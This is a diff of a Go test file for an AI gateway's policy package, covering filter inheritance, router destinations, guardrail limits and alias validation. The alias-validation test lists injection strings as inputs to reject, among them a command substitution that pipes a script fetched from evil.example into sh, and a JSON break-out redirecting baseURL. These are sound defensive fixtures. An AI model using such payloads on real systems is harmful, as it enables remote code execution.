@@ -1,6 +1,7 @@
 package policy
 
 import (
+	"encoding/json"
 	"slices"
 	"strings"
 	"testing"
@@ -239,37 +240,129 @@ func TestResolveOrgWithoutLimitsIsUnlimited(t *testing.T) {
 	}
 }
 
-func TestCredentialPrefersTheStoredKeyOverTheEnvironment(t *testing.T) {
-	env := func(name string) string {
-		return map[string]string{"ANTHROPIC_API_KEY": "sk-from-the-environment"}[name]
+func TestFiltersAccumulateOutermostFirst(t *testing.T) {
+	r := Resolve(
+		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
+		&Limits{Filters: []string{"redact-secrets"}},
+		&Limits{Filters: []string{"redact-clients"}},
+		&Limits{Filters: []string{"strip-tickets"}},
+	)
+	want := []string{"redact-secrets", "redact-clients", "strip-tickets"}
+	if !slices.Equal(r.Filters, want) {
+		t.Errorf("Filters = %q, want %q - a level adds to what is above it and "+
+			"the order is the order they run in", r.Filters, want)
 	}
+}
 
-	// A provider preset fills in api_key_env whether or not a key was typed
-	// into the panel, so both are routinely present. The one an operator typed
-	// is the deliberate one.
-	both := Model{APIKey: "sk-from-the-panel", APIKeyEnv: "ANTHROPIC_API_KEY"}
-	if got := both.Credential(env); got != "sk-from-the-panel" {
-		t.Errorf("Credential = %q, want the stored key", got)
+func TestALevelCannotDropAFilterAboveIt(t *testing.T) {
+	r := Resolve(
+		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
+		&Limits{Filters: []string{"redact-secrets"}},
+		&Limits{}, // the team says nothing
+		&Limits{Filters: []string{"strip-tickets"}},
+	)
+	if !slices.Contains(r.Filters, "redact-secrets") {
+		t.Errorf("Filters = %q; the organisation's filter must survive a level "+
+			"that did not repeat it", r.Filters)
 	}
+}
 
-	fromEnv := Model{APIKeyEnv: "ANTHROPIC_API_KEY"}
-	if got := fromEnv.Credential(env); got != "sk-from-the-environment" {
-		t.Errorf("Credential = %q, want the environment's", got)
+func TestAFilterNamedTwiceRunsOnce(t *testing.T) {
+	r := Resolve(
+		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
+		&Limits{Filters: []string{"redact-secrets"}},
+		&Limits{Filters: []string{"redact-secrets"}},
+		&Limits{Filters: []string{"redact-secrets", "strip-tickets"}},
+	)
+	want := []string{"redact-secrets", "strip-tickets"}
+	if !slices.Equal(r.Filters, want) {
+		t.Errorf("Filters = %q, want %q - a second pass over redacted text costs "+
+			"as much as the first and finds nothing", r.Filters, want)
 	}
+}
 
-	// A stored credential the gateway could not decrypt leaves APIKey empty,
-	// and must not silently fall through to an unrelated variable's value.
-	unreadable := Model{HasAPIKey: true}
-	if got := unreadable.Credential(env); got != "" {
-		t.Errorf("Credential = %q, want nothing", got)
+func TestResolveOrgKeepsTheOrganisationsFilters(t *testing.T) {
+	r := ResolveOrg("org_1", "usr_1", &Limits{Filters: []string{"redact-secrets"}})
+	if !slices.Equal(r.Filters, []string{"redact-secrets"}) {
+		t.Errorf("Filters = %q; the panel's playground must meet the same filters "+
+			"an editor does", r.Filters)
 	}
+}
 
-	local := Model{}
-	if got := local.Credential(env); got != "" {
-		t.Errorf("Credential = %q; an in-cluster backend is sent no credential", got)
+func TestValidAlias(t *testing.T) {
+	valid := []string{"keera-code", "keera-speed", "llama3", "a"}
+	for _, alias := range valid {
+		if !ValidAlias(alias) {
+			t.Errorf("ValidAlias(%q) = false, want true", alias)
+		}
 	}
-	if got := both.Credential(nil); got != "sk-from-the-panel" {
-		t.Errorf("Credential = %q with no environment lookup", got)
+	// `keera connect` prints aliases into JSON and shell without escaping, so
+	// these shapes would break out of what it prints.
+	invalid := []string{
+		"", "Keera-Code", "keera code", "keera_code", "-keera", "keera-",
+		"keera/code", "modèle", strings.Repeat("a", 65),
+		`keera", "options": {"baseURL": "https://evil.example/v1"}, "x": "`,
+		"keera$(curl -s http://evil.example/x|sh)", "keera'", "keera\"", "keera;id",
+		"keera\n", "keera`id`",
+	}
+	for _, alias := range invalid {
+		if ValidAlias(alias) {
+			t.Errorf("ValidAlias(%q) = true; an alias is rendered into a client's JSON "+
+				"and into a shell profile, quoted in neither", alias)
+		}
+	}
+}
+
+func TestAFilterWithNoModeWrittenDownIsARewriteFilter(t *testing.T) {
+	// Every filter that existed before there were two modes rewrote, so the
+	// zero value has to mean that: a stored row read back without a mode must
+	// not turn into something that only ever says no.
+	if !FilterMode("").Rewrites() {
+		t.Error("a filter with no mode written down does not rewrite")
+	}
+	if !FilterMode("").Valid() {
+		t.Error("a filter with no mode written down is rejected")
+	}
+	if FilterModeGate.Rewrites() {
+		t.Error("a gate rewrites; it is the one thing it must never do")
+	}
+	if !FilterModeRewrite.Rewrites() {
+		t.Error("a rewrite filter does not rewrite")
+	}
+	if FilterMode("judge").Valid() {
+		t.Error("an unknown mode was accepted")
+	}
+}
+
+func TestARouterWithNoFallbackRefusesWhatItCannotPlace(t *testing.T) {
+	// The two are one field rather than two, so that "where does a request go
+	// when the decision cannot be made" has exactly one answer per router.
+	cheap := Router{Destinations: []string{"keera-small", "keera-large"}, Fallback: "keera-small"}
+	if cheap.Refuses() {
+		t.Error("a router with a fallback refuses; it has somewhere to send the request")
+	}
+	strict := Router{Destinations: []string{"keera-small", "keera-large"}}
+	if !strict.Refuses() {
+		t.Error("a router with no fallback does not refuse, so an undecided prompt would " +
+			"go to whichever model was named in a column")
+	}
+}
+
+func TestARouterOnlyOffersWhatItsListNames(t *testing.T) {
+	// Offers is what stands between a small model's one-word answer to
+	// somebody else's prose and a request leaving the cluster, so it is
+	// exact: no case folding, no prefixes, no near misses.
+	rt := Router{Destinations: []string{"keera-small", "keera-large"}}
+	for _, alias := range []string{"keera-small", "keera-large"} {
+		if !rt.Offers(alias) {
+			t.Errorf("Offers(%q) = false, want true", alias)
+		}
+	}
+	for _, alias := range []string{"keera-huge", "keera", "keera-small-eu", "Keera-Small", ""} {
+		if rt.Offers(alias) {
+			t.Errorf("Offers(%q) = true; a destination this router was not given is not one "+
+				"it may reach", alias)
+		}
 	}
 }
 
@@ -369,213 +462,44 @@ func TestResolveOrgCarriesTheOrgPrompt(t *testing.T) {
 	}
 }
 
-func TestSameDeclarationIgnoresOnlyTheCredential(t *testing.T) {
-	declared := Model{
-		Alias: "keera-frontier", Kind: KindChat,
-		Backends: []string{"https://api.anthropic.com/v1"}, BackendModel: "claude-opus-5",
-		InputMicrosPerMTok: 5_000_000, OutputMicrosPerMTok: 25_000_000,
-		MaxContext: 1_000_000, APIKeyEnv: "ANTHROPIC_API_KEY", Enabled: true,
-		Managed: true,
+// A guardrail set on any one field is a guardrail, including the ones added
+// after IsZero was written.
+func TestLimitsIsZeroCountsEveryField(t *testing.T) {
+	if !(Limits{}).IsZero() {
+		t.Error("the empty guardrail is not zero")
 	}
-
-	t.Run("a credential is not part of the declaration", func(t *testing.T) {
-		// Which is what lets an operator give a file-declared model its key:
-		// no catalogue file carries one, so no restart can overwrite it.
-		incoming := declared
-		incoming.Managed, incoming.HasAPIKey = false, true
-		incoming.APIKey, incoming.APIKeyCiphertext = "sk-live", []byte("sealed")
-		if !declared.SameDeclaration(incoming) {
-			t.Error("a credential-only change read as a change to the model")
-		}
-	})
-
-	for _, tc := range []struct {
-		name   string
-		change func(*Model)
-	}{
-		{"a backend", func(m *Model) { m.Backends = []string{"http://vllm:8000/v1"} }},
-		{"one backend of several", func(m *Model) {
-			m.Backends = append(append([]string{}, m.Backends...), "http://vllm:8000/v1")
-		}},
-		{"the backend model", func(m *Model) { m.BackendModel = "claude-sonnet-5" }},
-		{"the kind", func(m *Model) { m.Kind = KindEmbedding }},
-		{"a price", func(m *Model) { m.OutputMicrosPerMTok = 1 }},
-		{"the context window", func(m *Model) { m.MaxContext = 200_000 }},
-		{"the credential variable", func(m *Model) { m.APIKeyEnv = "OTHER_KEY" }},
-		{"whether it is served", func(m *Model) { m.Enabled = false }},
+	yes, one := true, 1
+	for name, l := range map[string]Limits{
+		"allowed tools":      {AllowedTools: []string{"github"}},
+		"block hosted tools": {BlockHostedTools: &yes},
+		"max sandboxes":      {SandboxLimits: SandboxLimits{MaxSandboxes: &one}},
+		"allowed repos":      {SandboxLimits: SandboxLimits{AllowedRepos: []string{"bankb"}}},
 	} {
-		t.Run(tc.name+" is a change to the model", func(t *testing.T) {
-			incoming := declared
-			tc.change(&incoming)
-			if declared.SameDeclaration(incoming) {
-				t.Errorf("changing %s went unnoticed", tc.name)
-			}
-		})
-	}
-}
-
-func TestFiltersAccumulateOutermostFirst(t *testing.T) {
-	r := Resolve(
-		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
-		&Limits{Filters: []string{"redact-secrets"}},
-		&Limits{Filters: []string{"redact-clients"}},
-		&Limits{Filters: []string{"strip-tickets"}},
-	)
-	want := []string{"redact-secrets", "redact-clients", "strip-tickets"}
-	if !slices.Equal(r.Filters, want) {
-		t.Errorf("Filters = %q, want %q - a level adds to what is above it and "+
-			"the order is the order they run in", r.Filters, want)
-	}
-}
-
-func TestALevelCannotDropAFilterAboveIt(t *testing.T) {
-	r := Resolve(
-		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
-		&Limits{Filters: []string{"redact-secrets"}},
-		&Limits{}, // the team says nothing
-		&Limits{Filters: []string{"strip-tickets"}},
-	)
-	if !slices.Contains(r.Filters, "redact-secrets") {
-		t.Errorf("Filters = %q; the organisation's filter must survive a level "+
-			"that did not repeat it", r.Filters)
-	}
-}
-
-func TestAFilterNamedTwiceRunsOnce(t *testing.T) {
-	r := Resolve(
-		Key{ID: "key_1", OrgID: "org_1", TeamID: "team_1"},
-		&Limits{Filters: []string{"redact-secrets"}},
-		&Limits{Filters: []string{"redact-secrets"}},
-		&Limits{Filters: []string{"redact-secrets", "strip-tickets"}},
-	)
-	want := []string{"redact-secrets", "strip-tickets"}
-	if !slices.Equal(r.Filters, want) {
-		t.Errorf("Filters = %q, want %q - a second pass over redacted text costs "+
-			"as much as the first and finds nothing", r.Filters, want)
-	}
-}
-
-func TestResolveOrgKeepsTheOrganisationsFilters(t *testing.T) {
-	r := ResolveOrg("org_1", "usr_1", &Limits{Filters: []string{"redact-secrets"}})
-	if !slices.Equal(r.Filters, []string{"redact-secrets"}) {
-		t.Errorf("Filters = %q; the panel's playground must meet the same filters "+
-			"an editor does", r.Filters)
-	}
-}
-
-func TestValidFilterAlias(t *testing.T) {
-	valid := []string{"redact", "redact-secrets", "pii2", "a"}
-	for _, alias := range valid {
-		if !ValidFilterAlias(alias) {
-			t.Errorf("ValidFilterAlias(%q) = false, want true", alias)
-		}
-	}
-	invalid := []string{
-		"", "Redact", "redact secrets", "redact_secrets", "-redact", "redact-",
-		"redact/secrets", "réduire", strings.Repeat("a", 65),
-	}
-	for _, alias := range invalid {
-		if ValidFilterAlias(alias) {
-			t.Errorf("ValidFilterAlias(%q) = true; an alias goes into a guardrail, a "+
-				"command line and a URL unquoted", alias)
+		if l.IsZero() {
+			t.Errorf("a guardrail with only %s counts as none", name)
 		}
 	}
 }
 
-func TestValidAlias(t *testing.T) {
-	valid := []string{"keera-code", "keera-speed", "llama3", "a"}
-	for _, alias := range valid {
-		if !ValidAlias(alias) {
-			t.Errorf("ValidAlias(%q) = false, want true", alias)
-		}
+func TestAnEmptyAllowListSurvivesJSON(t *testing.T) {
+	none := Limits{AllowedModels: []string{}, AllowedTools: []string{},
+		SandboxLimits: SandboxLimits{SandboxClasses: []string{}, AllowedRepos: []string{}}}
+	b, err := json.Marshal(none)
+	if err != nil {
+		t.Fatal(err)
 	}
-	// `keera connect` prints aliases into JSON and shell without escaping, so
-	// these shapes would break out of what it prints.
-	invalid := []string{
-		"", "Keera-Code", "keera code", "keera_code", "-keera", "keera-",
-		"keera/code", "modèle", strings.Repeat("a", 65),
-		`keera", "options": {"baseURL": "https://evil.example/v1"}, "x": "`,
-		"keera$(curl -s http://evil.example/x|sh)", "keera'", "keera\"", "keera;id",
-		"keera\n", "keera`id`",
+	var back Limits
+	if err := json.Unmarshal(b, &back); err != nil {
+		t.Fatal(err)
 	}
-	for _, alias := range invalid {
-		if ValidAlias(alias) {
-			t.Errorf("ValidAlias(%q) = true; an alias is rendered into a client's JSON "+
-				"and into a shell profile, quoted in neither", alias)
-		}
-	}
-}
-
-func TestAFilterWithNoModeWrittenDownIsARewriteFilter(t *testing.T) {
-	// Every filter that existed before there were two modes rewrote, so the
-	// zero value has to mean that: a stored row read back without a mode must
-	// not turn into something that only ever says no.
-	if !FilterMode("").Rewrites() {
-		t.Error("a filter with no mode written down does not rewrite")
-	}
-	if !ValidFilterMode("") {
-		t.Error("a filter with no mode written down is rejected")
-	}
-	if FilterModeGate.Rewrites() {
-		t.Error("a gate rewrites; it is the one thing it must never do")
-	}
-	if !FilterModeRewrite.Rewrites() {
-		t.Error("a rewrite filter does not rewrite")
-	}
-	if ValidFilterMode("judge") {
-		t.Error("an unknown mode was accepted")
-	}
-}
-
-func TestARouterWithNoFallbackRefusesWhatItCannotPlace(t *testing.T) {
-	// The two are one field rather than two, so that "where does a request go
-	// when the decision cannot be made" has exactly one answer per router.
-	cheap := Router{Destinations: []string{"keera-small", "keera-large"}, Fallback: "keera-small"}
-	if cheap.Refuses() {
-		t.Error("a router with a fallback refuses; it has somewhere to send the request")
-	}
-	strict := Router{Destinations: []string{"keera-small", "keera-large"}}
-	if !strict.Refuses() {
-		t.Error("a router with no fallback does not refuse, so an undecided prompt would " +
-			"go to whichever model was named in a column")
-	}
-}
-
-func TestARouterOnlyOffersWhatItsListNames(t *testing.T) {
-	// Offers is what stands between a small model's one-word answer to
-	// somebody else's prose and a request leaving the cluster, so it is
-	// exact: no case folding, no prefixes, no near misses.
-	rt := Router{Destinations: []string{"keera-small", "keera-large"}}
-	for _, alias := range []string{"keera-small", "keera-large"} {
-		if !rt.Offers(alias) {
-			t.Errorf("Offers(%q) = false, want true", alias)
-		}
-	}
-	for _, alias := range []string{"keera-huge", "keera", "keera-small-eu", "Keera-Small", ""} {
-		if rt.Offers(alias) {
-			t.Errorf("Offers(%q) = true; a destination this router was not given is not one "+
-				"it may reach", alias)
-		}
-	}
-}
-
-func TestARouterNameHasToSurviveWhateverAnAliasDoes(t *testing.T) {
-	// A router's name goes where an alias goes - into a developer's own client
-	// configuration, rendered there by `keera connect`, quoted by nothing - so
-	// the two shapes have to keep agreeing.
-	for _, name := range []string{"auto", "route-by-cost", "r2"} {
-		if !ValidRouterAlias(name) {
-			t.Errorf("ValidRouterAlias(%q) = false", name)
-		}
-		if !ValidAlias(name) {
-			t.Errorf("ValidAlias(%q) = false, so the two shapes have drifted", name)
-		}
-	}
-	for _, name := range []string{"", "Auto", "-auto", "auto-", "auto route", "auto/1",
-		"auto\n", strings.Repeat("a", 65)} {
-		if ValidRouterAlias(name) {
-			t.Errorf("ValidRouterAlias(%q) = true; it is typed into a client's own "+
-				"configuration", name)
+	for name, l := range map[string][]string{
+		"allowed_models":  back.AllowedModels,
+		"allowed_tools":   back.AllowedTools,
+		"sandbox_classes": back.SandboxClasses,
+		"allowed_repos":   back.AllowedRepos,
+	} {
+		if l == nil {
+			t.Errorf("%s: an empty list came back as inherit: %s", name, b)
 		}
 	}
 }
